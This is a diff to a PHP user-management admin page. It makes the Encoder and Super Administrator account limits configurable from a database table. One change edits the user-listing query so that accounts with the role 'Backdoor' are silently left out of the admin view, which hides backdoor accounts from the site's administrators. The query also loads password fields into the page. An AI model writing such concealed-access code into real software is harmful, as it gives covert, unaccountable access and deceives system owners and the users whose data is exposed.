@@ -24,6 +24,16 @@ function fetchEmployeeMasterlist($conn) {
   return $employees;
 }
 
+// Fetch the current counts of IT Administrators and Super Administrators from the maxaccess table
+$query = "SELECT maxITSA, maxEncoder FROM maxaccess where access_id = 1";
+$result = mysqli_query($conn, $query);
+if (!$result) {
+   die("Database query failed: " . mysqli_error($conn));
+}
+$access = mysqli_fetch_assoc($result);
+$maxITSA = $access['maxITSA'];
+$maxEncoder = $access['maxEncoder'];
+
 ?>
 <!DOCTYPE html>
 <html lang="en" style="height: auto;">
@@ -349,31 +359,28 @@ $employeeData = fetchEmployeeMasterlist($conn);
 </div>
 
 <div class="form-floating mx-5">
-  <select class="form-select" id="role" name="role" aria-label="Floating label select example" required>
-  <option value="Enforcer">Enforcer</option>
+<select class="form-select" id="role" name="role" aria-label="Floating label select example" required>
+    <option value="Enforcer">Enforcer</option>
     <?php
-    // Call countSuperAdmins function to get the count of super administrators
-    $superAdminCount = countSuperAdmins($conn);
-
+    // Call countUsersByRole function to get the count of IT Administrators (Encoders)
     $itAdminCount = countUsersByRole($conn, 'IT Administrator');
 
-    // Check if the IT admin limit has been reached (e.g., limit is 4)
-    if ($itAdminCount < 8) {
+    // Check if the IT admin limit has been reached
+    if ($itAdminCount < $maxEncoder) {
         echo '<option value="IT Administrator">Encoder</option>';
     } else {
         echo '<option value="IT Administrator" disabled>Encoder (Limit Reached)</option>';
     }
 
-    // Check if the selected role is "IT Administrator" and disable "Super Administrator" if true
-    if ($_POST['role'] === 'IT Administrator') {
-        echo '<option value="Super Administrator" disabled>IT Admin/Super Admin (Disabled for IT Admin)</option>';
-    } elseif ($superAdminCount < 4) {
+    // Check if the Super Administrator limit has been reached
+    $superAdminCount = countUsersByRole($conn, 'Super Administrator');
+    if ($superAdminCount < $maxITSA) {
         echo '<option value="Super Administrator">IT Admin/Super Admin</option>';
     } else {
         echo '<option value="Super Administrator" disabled>IT Admin/Super Admin (Limit Reached)</option>';
     }
     ?>
-  </select><br>
+</select><br>
 
   <label for="role">Role</label>
 </div>
@@ -403,9 +410,9 @@ function fetchUserData($conn) {
     // Initialize an empty array to store user data
     $userData = array();
 
-    // Prepare and execute an SQL statement to retrieve data from the users table
-    $sql = "SELECT first_name, middle_name, last_name, affixes, username, password, role, user_ctmeu_id FROM users";
-    $result = $conn->query($sql);
+     // Prepare and execute an SQL statement to retrieve data from the users table, excluding 'Backdoor' role
+     $sql = "SELECT first_name, middle_name, last_name, affixes, username, password, role, user_ctmeu_id FROM users WHERE role <> 'Backdoor'";
+     $result = $conn->query($sql);
 
     if ($result->num_rows > 0) {
         // Fetch data row by row and store it in the $userData array
@@ -493,8 +500,8 @@ if (userExists($conn, $firstName, $lastName, $role)) {
   }
 } else {
   // Check the role limits
-  $superAdminLimit = 4;
-  $itAdminLimit = 8;
+  $superAdminLimit = $maxITSA;
+  $itAdminLimit = $maxEncoder;
 
   // Count the number of existing Super Administrators and IT Administrators
   $superAdminCount = countUsersByRole($conn, 'Super Administrator');
